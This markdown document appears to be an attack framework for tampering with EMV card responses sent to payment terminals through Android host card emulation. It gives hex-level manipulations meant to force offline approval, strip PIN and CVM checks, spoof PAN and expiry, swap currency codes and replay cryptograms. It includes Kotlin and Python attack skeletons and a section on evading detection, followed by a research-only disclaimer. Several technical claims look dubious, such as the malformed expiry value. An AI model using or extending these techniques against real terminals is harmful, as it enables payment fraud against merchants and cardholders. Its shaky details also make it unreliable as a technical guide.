# EMV APDU Injection Attack Framework
## Card-Side Attacks Against Payment Terminals

Based on real EMV data from `emv.html` test card with comprehensive attack vectors for educational/research purposes.

---

## 🎯 ATTACK SURFACE ANALYSIS

### Real EMV Test Card Data (from emv.html):
- **PPSE Response**: `6f5b840e325041592e5359532e4444463031a549bf0c46...9000`  
- **AID #1**: `A0000000031010` (VISA DEBIT)
- **AID #2**: `A0000000980840` (US COMMON DEBIT)
- **Real Track2**: `4154904674973556D29022010000820083001F`
- **Real Cryptogram**: `D3967976E30EFAFC` (ARQC - Online Auth)
- **Real AIP**: `2000` (DDA supported)

---

## 🔥 CRITICAL EMV INJECTION POINTS

### 1. PPSE MANIPULATION ATTACKS
**Attack Vector**: Modify Payment System Environment response
**Target**: `SELECT PPSE (2PAY.SYS.DDF01)` command `00A404000E325041592E5359532E444446303100`

#### Attack 1A: AID Poisoning
```
Original AID: A0000000031010 (VISA)
Injected AID: A0000000041010 (MasterCard)
Effect: Terminal processes VISA card as MasterCard → routing/fee exploitation
```

#### Attack 1B: Priority Manipulation  
```
Original Priority: 87 01 01 (Priority 1)
Injected Priority: 87 01 00 (Priority 0 - highest)  
Effect: Force specific AID selection bypassing terminal preference
```

#### Attack 1C: Country Code Spoofing
```
Original Country: 5F 55 02 55 53 (US)
Injected Country: 5F 55 02 43 4E (CN - China)
Effect: Bypass geographic restrictions, alter currency handling
```

---

### 2. AID SELECTION ATTACKS
**Attack Vector**: Modify application selection and FCI data
**Target**: `SELECT AID A0000000031010` command `00A4040007A000000003101000`

#### Attack 2A: Application Hijacking
```
Request AID:  A0000000031010 (VISA)
Response AID: A0000000041010 (MasterCard FCI)
Effect: Terminal thinks it's talking to MasterCard while selecting VISA
```

#### Attack 2B: Capability Spoofing
```
Original PDOL: 9F66049F02069F03069F1A0295055F2A029A039C019F3704
Injected PDOL: (Remove terminal verification requirements)
Effect: Bypass terminal security validations
```

---

### 3. GPO (GET PROCESSING OPTIONS) ATTACKS  
**Attack Vector**: Manipulate card capabilities and transaction data
**Target**: GPO command `80A800238321270000000000...`

#### Attack 3A: AIP (Application Interchange Profile) Manipulation
```
Real AIP from emv.html: 82 02 20 00 (DDA, No offline PIN)
Attack Modes:
- 82 02 00 08 → Force offline approval (bypass online auth)  
- 82 02 7C 00 → Upgrade to DDA+CDA+SDA+PIN capabilities
- 82 02 18 00 → Enable offline PIN verification
- 82 02 08 00 → Offline data authentication only
```

#### Attack 3B: Track2 Data Spoofing  
```
Real Track2: 57 13 41 54 90 46 74 97 35 56 D2 90 22 01 00 00 82 00 83 00 1F
PAN: 4154904674973556, Expiry: 2902 (Feb 2029)
Attack Vectors:
- Change PAN: 4000000000000002 (test card number)
- Change Expiry: D2512 (May 2025 vs Feb 2029) 
- Alter service code: 201→101 (change transaction restrictions)
- Modify discretionary data for different limits
```

#### Attack 3C: Cryptogram Manipulation
```
Real Cryptogram: 9F26 08 D3 96 79 76 E3 0E FA FC (ARQC)
Cryptogram Type: 9F27 01 80 (ARQC - Online Authorization Required)
Attack Modes:
- Change to TC (40): 9F27 01 40 → Force offline approval
- Invalid cryptogram: 9F26 08 00 00 00 00 00 00 00 00 → Test auth bypass
- Replay old cryptogram with new ATC for replay attack
```

#### Attack 3D: Transaction Counter (ATC) Manipulation
```
Real ATC: 9F36 02 01 1E (Transaction count: 286)
Attack: Replay lower ATC values to simulate old transactions
Effect: Potential replay attack if terminal doesn't validate ATC properly
```

---

### 4. CVM (CARDHOLDER VERIFICATION METHOD) BYPASS
**Attack Vector**: Remove or modify cardholder verification requirements

#### Attack 4A: CVM List Removal
```
Normal: CVM List present (8E tag) requiring PIN/signature  
Attack: Remove CVM List entirely from GPO response
Effect: No PIN/signature required for high-value transactions
```

#### Attack 4B: CVM Downgrade
```
Normal CVM: Online PIN required for amounts >$50
Attack CVM: No CVM required for any amount (fail cardholder verification)  
Effect: Bypass PIN for high-value transactions
```

---

### 5. CURRENCY & AMOUNT MANIPULATION
**Attack Vector**: Exploit currency code and amount handling

#### Attack 5A: Currency Code Injection
```
Terminal Currency: 5F2A 02 08 40 (USD - 840)
Injected Currency: 5F2A 02 09 78 (EUR - 978)  
Effect: $100 USD processed as €100 EUR → exchange rate exploitation
```

#### Attack 5B: Amount Reflection Attack  
```
Terminal Amount: 9F02 06 00 00 00 00 10 00 ($100.00)
Card Response: Same amount but different currency
Effect: Create confusion between terminal and backend systems
```

---

### 6. OFFLINE DATA AUTHENTICATION ATTACKS
**Attack Vector**: Manipulate authentication methods and bypass validation

#### Attack 6A: Force Offline Processing
```
Normal: ARQC (80) → Online authorization required
Attack: TC (40) → Transaction approved offline
Effect: Bypass online fraud detection systems
```

#### Attack 6B: Authentication Method Downgrade
```
Normal: DDA (Dynamic Data Authentication) - AIP bit 5 set
Attack: SDA (Static Data Authentication) - Remove DDA capability  
Effect: Weaker authentication, potential cloning vulnerability
```

---

### 7. READ RECORD MANIPULATION
**Attack Vector**: Modify application data retrieved from records

#### Attack 7A: Certificate Spoofing
```
Normal: Valid issuer certificate in record
Attack: Replace with test/expired certificate
Effect: Authentication bypass if terminal doesn't validate properly
```

#### Attack 7B: Cardholder Data Manipulation
```
Real Data: 5F20 0F 43 41 52 44 48 4F 4C 44 45 52 2F 56 49 53 41 (CARDHOLDER/VISA)
Attack: Inject different cardholder name or special characters
Effect: Receipt manipulation, social engineering potential
```

---

## 🛠️ IMPLEMENTATION FRAMEWORK

### Android HCE Attack Interface
```kotlin
class EmvAttackManager {
    // Real EMV data from emv.html as baseline
    private val realEmvData = EmvTestData()
    
    fun executeAttack(attackId: Int, targetApdu: ByteArray): ByteArray {
        return when(attackId) {
            1 -> ppseAidPoisoning(targetApdu)
            2 -> aipManipulation(targetApdu)  
            3 -> track2Spoofing(targetApdu)
            4 -> cryptogramAttack(targetApdu)
            5 -> cvmBypass(targetApdu)
            6 -> currencyManipulation(targetApdu)
            7 -> offlineForce(targetApdu)
            else -> realEmvData.getStandardResponse(targetApdu)
        }
    }
}
```

### Terminal Testing Integration
```python
# us_terminal_card_manipulation.py enhanced with real EMV attack data
class EmvCardAttack:
    def __init__(self):
        self.emv_data = load_emv_html_data()  # Real test card data
        
    def attack_modes(self):
        return {
            1: "PPSE AID Poisoning (VISA→MC)",
            2: "AIP Manipulation (Force Offline)", 
            3: "Track2 Spoofing (PAN/Expiry)",
            4: "Cryptogram Attack (ARQC→TC)",
            5: "CVM Bypass (No PIN Required)",
            6: "Currency Manipulation (USD→EUR)",
            7: "Authentication Downgrade (DDA→SDA)"
        }
```

---

## 📊 ATTACK SUCCESS METRICS

### Detection Evasion Techniques:
1. **Valid EMV Structure**: All attacks maintain proper TLV structure
2. **Realistic Data**: Based on real test card from emv.html  
3. **Timing Consistency**: Match normal card response times
4. **Progressive Attacks**: Start subtle, escalate based on terminal behavior
5. **Fallback Graceful**: Revert to normal behavior if attack detected

### Research Applications:
- Terminal security validation
- EMV specification compliance testing  
- Fraud detection system evaluation
- Payment processor vulnerability assessment
- Educational security training

---

## ⚠️ ETHICAL DISCLAIMER

This framework is for **educational and security research purposes only**. All attacks are based on publicly available EMV specifications and test data. Use only in controlled environments with proper authorization.

**Real EMV Test Card Data Source**: `emv.html` - Contains complete APDU flows for VISA TEST MSD validation including real Track2, cryptograms, and authentication data.

---

*Last Updated: 2025-09-20*  
*Based on real EMV test card data from emv.html*